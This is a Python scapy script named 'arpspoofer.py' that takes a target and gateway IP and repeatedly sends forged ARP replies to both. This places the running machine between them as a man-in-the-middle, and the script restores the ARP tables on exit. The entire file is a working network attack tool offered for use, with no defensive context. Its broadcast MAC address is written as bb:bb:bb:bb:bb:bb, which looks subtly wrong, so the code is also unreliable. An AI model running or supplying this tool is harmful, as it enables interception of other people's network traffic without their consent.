import time
import argparse
from scapy import all as scapy

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
    options = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify a target IP. Use --help for more information.")
    elif not options.gateway:
        parser.error("[-] Please specify a gateway IP. Use --help for more information.")
    return options

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    brdcast = scapy.Ether(dst="bb:bb:bb:bb:bb:bb")
    arp_req_brdcast = brdcast/arp_req
    answrd_lst = scapy.srp(arp_req_brdcast, timeout=1, verbose=False)[0]

    return answrd_lst[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) 
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


print("--------------------------------------------------")
print("|\t  arpspoofer.py - keode by relofa\t |")
print("--------------------------------------------------")

options = get_arguments()
tgt_ip = options.target
gw_ip = options.gateway

try:
    incrmnt = 0
    while True:
        spoof(tgt_ip, gw_ip)
        spoof(gw_ip, tgt_ip)
        incrmnt += 2
        print("\r[+] Sending Packets : " + str(incrmnt), end="")
        time.sleep(2)

except KeyboardInterrupt:
    restore(tgt_ip, gw_ip)
    restore(gw_ip, tgt_ip)
    print("\n[-] Restore connection")
    print("[-] Exit arpspoofer.py - keode by relofa")

except IndexError:
    restore(tgt_ip, gw_ip)
    restore(gw_ip, tgt_ip)
    print("\n[-] Force exit, restore connection")
    print("[-] Exit arpspoofer.py - keode by relofa")